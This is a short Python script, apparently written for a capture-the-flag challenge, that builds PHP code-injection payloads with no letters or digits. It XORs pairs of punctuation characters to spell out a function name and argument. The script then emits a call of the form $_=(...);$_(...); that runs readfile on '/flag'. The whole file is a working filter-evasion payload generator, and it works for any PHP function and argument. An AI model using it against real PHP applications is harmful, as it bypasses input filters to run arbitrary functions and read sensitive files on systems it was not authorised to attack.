def char_to_xor(target_char):
    # 允许使用的非字母数字 ASCII 字符集
    non_alnum = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "
    
    for c1 in non_alnum:
        for c2 in non_alnum:
            if chr(ord(c1) ^ ord(c2)) == target_char:
                # 对单引号和反斜杠进行转义以符合 PHP 语法
                c1_esc = c1.replace('\\', '\\\\').replace("'", "\\'")
                c2_esc = c2.replace('\\', '\\\\').replace("'", "\\'")
                return f"('{c1_esc}'^'{c2_esc}')"
                
    # 若本身为非字母数字，直接拼接
    target_esc = target_char.replace('\\', '\\\\').replace("'", "\\'")
    return f"'{target_esc}'"

def string_to_non_alnum(s):
    parts = []
    for char in s:
        if char.isalnum():
            # 字母和数字转换为异或拼接形式
            parts.append(char_to_xor(char))
        else:
            # 标点符号直接保留，对单引号和反斜杠进行转义
            char_esc = char.replace('\\', '\\\\').replace("'", "\\'")
            parts.append(f"'{char_esc}'")
    return ".".join(parts)

def generate_php_payload(func, arg):
    obf_func = string_to_non_alnum(func)
    obf_arg = string_to_non_alnum(arg)
    
    # 构造类似于 $_=(func); $_(arg); 的无字母数字 Payload
    return f"$_=({obf_func});$_({obf_arg});"

if __name__ == "__main__":
    function_name = "readfile"
    argument = "/flag"
    
    payload = generate_php_payload(function_name, argument)
    print(payload)